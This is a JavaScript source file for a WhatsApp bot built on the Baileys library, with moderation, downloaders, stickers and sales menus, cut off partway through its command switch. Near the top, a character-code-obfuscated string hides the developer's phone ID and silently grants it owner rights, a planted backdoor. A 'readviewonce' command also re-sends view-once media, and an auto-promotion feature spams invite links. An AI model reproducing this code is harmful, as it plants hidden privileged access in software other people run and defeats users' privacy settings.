/* 

=========================================================================

  #- Credits By Skyzopedia
   Contact: https://6285624297893
   Youtube: https://youtube.com/@Skyzodev
   Telegram: https://t.me/Skyzodev
    
  Developer : https://wa.me/6285624297893
  
  -[ ! ]- Jangan hapus contact developer! hargai pembuat script ini

=========================================================================

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./source/message');
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');


module.exports = Xyro = async (Xyro, m, chatUpdate, store) => {
	try {
await LoadDataBase(Xyro, m)
const botNumber = await Xyro.decodeJid(Xyro.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)


//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\n  Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n  From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Xyro.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Xyro.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Xyro.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Xyro.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Xyro.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Xyro.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Xyro.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Xyro.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Xyro.sendMessage(m.chat, {text: `
*~Pesan Otomatis~*

*Join Sini Kak*

* chat.whatsapp.com/Hbr1z88vxdv4ebA8Agy9kk

* chat.whatsapp.com/KdJpv9x9Tvz1cdee24dFNw

*Bt Admin Bisa Chat* wa.me/628551234826
`}, {quoted: null})
}
}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

if (!isCmd && !m.fromMe && !m.isGroup) {
if (db.settings.autoai == true) {
if (m.text) {
await Xyro.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
await fetchJson("https://btch.us.kg/prompt/gpt?prompt=Sekarang%20kamu%20adalah%20Xyro-AI&text=" + m.text).then(async (res) => {
await m.reply(res.result)
}).catch(e => e)
}
}}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return Xyro.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: m})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Xyro.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*Xyro* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*☁️ Vps Digital Ocean*
* Ram 1 Core 1 : 20K
* Ram 2 Core 1 : 25K
* Ram 2 Core 2 : 30K
* Ram 4 Core 2 : 40K
* Ram 8 Core 4 : 50K
* Ram 16 Core 4 : 70K

*⚠️ Note*
* High Quality 
* Free Install Panel
* Free Install Wings/Nodes
* Free Install Tema [ Ram 8, 16 ]
* Free Req Subdomain
* Free Reg Region, Os, Versi
* Free Egg Bot Wa
* Garansi 14 Days, 1× Claim

*© Powered By Xyro*`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*☁️ Pterodactyl*
* Panel Private 
* Panel Public
* Reseller Panel Private : 15K
* Reseller Panel Public : 10K
* Admin Panel : 15K
* Pt Panel : 25K
* Owner Panel : 30K

*⚠️ Note*
* Semua Permanen Kecuali Panel Private/Public
* Semua No Pt²
* Spek Vps Ram 16 Core 4
* Server/Panel Private Lebih Aman, Anti Rusuh, Dan Berkualitas
* Admin Pada Server/Panel Private Hanya Ada 1, Yaitu Saya Sendiri

*© Powered By Xyro`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Xyro.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const skyzodev = { Sky, toIDR, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, sleep, botNumber }
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, skyzodev)
}
}
if (!pluginsDisable) return

//============= [ COMMANDS ] ====================================================



switch (command) {
case "play": {
if (!text) return m.reply(example("dj tiktok"))
await Xyro.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Xyro.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Xyro.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await Xyro.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp4(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Xyro.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Xyro.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await Xyro.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await Xyro.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Xyro.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await ytdl.ytmp3(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Xyro.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Xyro.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Xyro.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Xyro.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Xyro.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "mediafire": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await Xyro.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Xyro.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Xyro.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await Xyro.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await Xyro.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://btch.us.kg/happymod?query=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.title}
* *Rating :* ${i.rating}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
Xyro.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error result not found."))
}
break

//================================================================================

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Xyro.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://btch.us.kg/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Xyro.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await Xyro.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Xyro.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repositori Tidak Ditemukan`)
}}
break

//================================================================================

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await Xyro.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Xyro.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Xyro.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await Xyro.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await Xyro.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await Xyro.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break


case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await Xyro.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await Xyro.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Xyro.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//================================================================================

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await Xyro.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: Xyro.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Xyro.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await Xyro.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ai": case "gpt": case "openai": case "chatgpt": {
let talk = text ? text : "hai"
await fetchJson("https://btch.us.kg/prompt/gpt?prompt=Sekarang%20kamu%20adalah%20Xyro-AI&text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//================================================================================

case "brat": {
if (!text) return m.reply(example('teksnya'))
let res = await getBuffer(`https://btch.us.kg/brat?text=${text}`)
await Xyro.sendAsSticker(m.chat, res, m, {packname: global.packname})
}
break

//================================================================================

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await Xyro.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await Xyro.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Xyro.downloadAndSaveMediaMessage(qmsg)
await Xyro.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Xyro.downloadAndSaveMediaMessage(qmsg)
await Xyro.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Xyro.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Xyro.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Xyro.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//================================================================================

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await Xyro.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Xyro.png');

let teks = directLink.toString()
await Xyro.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await Xyro.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Xyro.png');
let teks = directLink.toString()
await Xyro.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//================================================================================

case "tohd": case "hd": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
